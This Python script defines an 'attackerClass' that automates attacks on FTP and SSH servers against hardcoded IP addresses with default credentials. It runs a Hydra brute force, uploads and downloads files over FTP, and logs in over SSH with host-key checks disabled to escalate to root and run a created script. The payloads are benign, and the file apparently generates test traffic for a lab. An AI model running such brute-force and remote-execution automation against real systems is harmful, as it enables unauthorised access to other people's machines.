import os
import pexpect
import re
import time
from pexpect import pxssh
import logging as log
import inspect
import json

log.basicConfig(filename='attacker.log',level=log.DEBUG)

class attackerClass(object):

	"===================================================================INITIALISE========================================================================="
	def __init__(self):
		self.ip = ""
		self.username = ""
		self.password = ""
		self.command = ""
		self.db_array = ""
		self.method = ""
		
	"===================================================================INITIALISE========================================================================="
	
	@staticmethod
	def kill_hydra():
		'''
		Method kills hydra service
		'''
		os.system("pkill -f hydra")

	@staticmethod
	def generate_random_request(service_array):
		'''
		Method gets randomly generated data
		Iterates through data
		Compares current value to next value inside the items
		If ip and service and method are the same nothing is executed
		Else call_class_method is executed
		If method is repeating it will only be executed once
		'''
		try: 
			for key, val in service_array.items():
				current_ip = val[0].get("IP")
				current_method = val[0].get("Method")
				current_service = val[0].get("Service") 
				current_user = val[0].get("User") 
				current_pass = val[0].get("Password") 
				
				for nextElement in range(key+1,len(service_array)):
					next_ip = service_array[nextElement][0]["IP"]
					next_method = service_array[nextElement][0]["Method"]
					next_service = service_array[nextElement][0]["Service"]
					
					if current_ip == next_ip and current_service == next_service and current_method == next_method:
						print("Repeating Method: {} On Server: {} Service: {} \n".format(current_method,current_ip,current_service))
						break
					elif current_ip == next_ip and current_service == next_service and current_method != next_method:
						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
						break
					elif current_ip != next_ip and current_service != next_service and current_method != next_method:
						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
						break
											
		except Exception as e:
			print (str(e))
			log.exception(e)
		
	@staticmethod	
	def call_class_method(method,ip,user,password):
		'''
		Method passes arguments to class methods and executes the called method 
		'''
		try:
			values = {"IP":ip,"User":user,"Pass":password}
			the_method = getattr(attackerClass,method)(values)
			print()
			print("Method: "+method+" Executed")
			
		except Exception as e:
			print (str(e))
			log.exception(e)
		
	
	@staticmethod	
	def hydra_spawn(args): 
		'''
		Start Hydra and find username and password for IP address
		If username and password found kill hydra 
		Execute collect data method
		'''
		
		ip = args["IP"]
		
		try:
			print("Hydra BruteForce Being Executed")
			command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)	
			child = pexpect.spawn(command)	
			time.sleep(30)
			print("BruteForce Successfully Executed")
			child.close()
			attackerClass.kill_hydra()

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pexpect.EOF:
			print("BruteForce Executed")
			child.close()
			attackerClass.kill_hydra()

	"===================================================================FTP METHODS========================================================================="		
	#Anonymous User Methods
	@staticmethod
	def execute_ftp_login_anon_user(args):
		'''
		FTP directly into the machine using parameters received
		'''
		
		ip = args["IP"]
		user = args["User"]
		
		try:
			print("Anonymous Login Being Executed")
			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline("bye")

			print("Anonymous Login Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)
			
	@staticmethod
	def execute_ftp_put_anon_file(args):		
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''
		ip = args["IP"]
		user = args["User"]
		
		try:
			print("Anonymous File Creation Being Executed")
			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline("put execute.sh")
			child.expect(">")
			child.sendline("bye")

			print("Anonymous File Creation Successfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_ftp_get_anon_file(args):		
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''
		
		ip = args["IP"]
		user = args["User"]
		
		try:
			print("Anonymous File Download Executed")
			line = "ftp -p {}".format(ip)
			file_command = "get {}".format("myfile.txt")
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline(file_command)
			child.expect(">")
			child.sendline("bye")

			print("Anonymous File Download Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

	#Normal User Methods	
	@staticmethod
	def execute_ftp_login_normal_user(args):
		'''
		FTP directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]
		
		try:
			print("Login Being Executed")
			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline("bye")

			print("Login Succesfully Executed")

		except Exception as e:
			print (str(e))

	@staticmethod
	def execute_ftp_put_user_file(args):		
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''
		
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]
		
		try:
			print("File Creation Being Executed")
			line = "ftp -p {}".format(ip)
			file_command = "put {}".format("execute.py")
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline(file_command)
			child.expect(">")
			child.sendline("bye")

			print("File Creation Successfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_ftp_get_user_file(args):		
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''
		
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]
		
		try:
			print("File Download Being Executed")

			line = "ftp -p {}".format(ip)
			file_command = "get {}".format("execute.py")
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline(file_command)
			child.expect(">")
			child.sendline("bye")

			print("File Download Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)
	"===================================================================FTP METHODS========================================================================="
	
	"===================================================================SSH METHODS========================================================================="		
	#Make precautions for new key when prompted so
	@staticmethod
	def execute_ssh_login(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]
		
		try:
			print("SSH Login Being Executed")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("exit")

				print("SSH Login Succesful ")

			if index == 1:
				ssh_handle.expect("$")
				ssh_handle.sendline("exit")

				print("SSH Login Succesful ")

		except Exception as e:
			print (str(e))

		except pxssh.ExceptionPxssh as e:
			print("Error")
			print (str(e))

	@staticmethod
	def execute_ssh_sudo(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]
		
		try:
			print("SSH sudo Login Being Executed") 
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("logout")

				print("SSH sudo Login Succesful ")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("logout")

				print("SSH sudo Login Succesful ")

		except Exception as e:
			print (str(e))

		except pxssh.ExceptionPxssh as e:
			print("Error")
			print (str(e))


	@staticmethod
	def execute_ssh_create_file(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]
		
		try:
			print("File Being Created")

			file_command = """echo '#!/bin/bash' >> exe.sh &&  echo 'echo Hello World!' >> exe.sh"""

			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Created")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Created")

		except Exception as e:
			print (str(e))

		except pxssh.ExceptionPxssh as e:
			print (str(e))

	@staticmethod
	def execute_ssh_execute_file(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]
		
		try:
			print("File Being Executed")
			file_command = "{} {}".format("bash","exe.sh")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Executed")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Executed")

		except Exception as e:
			print (str(e))

		except pxssh.ExceptionPxssh as e:
			print (str(e))
	"===================================================================SSH METHODS========================================================================="

if __name__ == "__main__":
	object = attackerClass()
	the_array = {
	0: [{
		"Service": "FTP",
		"IP": "146.64.182.213",
		"User": "ftpserver1",
		"Password": "ftpserver1",
		"Method": "hydra_spawn"
	}],
	1: [{
		"Service": "SSH",
		"IP": "10.0.5.37",
		"User": "ubuntu",
		"Password": "ubuntu",
		"Method": "hydra_spawn"
	}],
	2: [{
		"Service": "FTP",
		"IP": "146.64.182.213",
		"User": "ftpserver1",
		"Password": "ftpserver1",
		"Method": "execute_ftp_put_user_file"
	}],
	3: [{
		"Service": "FTP",
		"IP": "146.64.182.213",
		"User": "ftp",
		"Password": "ftp",
		"Method": "execute_ftp_login_anon_user"
	}],
	4: [{
		"Service": "SSH",
		"IP": "10.0.5.37",
		"User": "ubuntu",
		"Password": "ubuntu",
		"Method": "execute_ssh_login"
	}],
	5: [{
		"Service": "SSH",
		"IP": "10.0.5.37",
		"User": "ubuntu",
		"Password": "ubuntu",
		"Method": "execute_ssh_create_file"
	}],
	6: [{
		"Service": "SSH",
		"IP": "10.0.5.37",
		"User": "ubuntu",
		"Password": "ubuntu",
		"Method": "execute_ssh_create_file"
	}],
	7: [{
		"Service": "FTP",
		"IP": "146.64.182.213",
		"User": "ftpserver1",
		"Password": "ftpserver1",
		"Method": "execute_ftp_get_user_file"
	}]
}
	
	object.generate_random_request(the_array)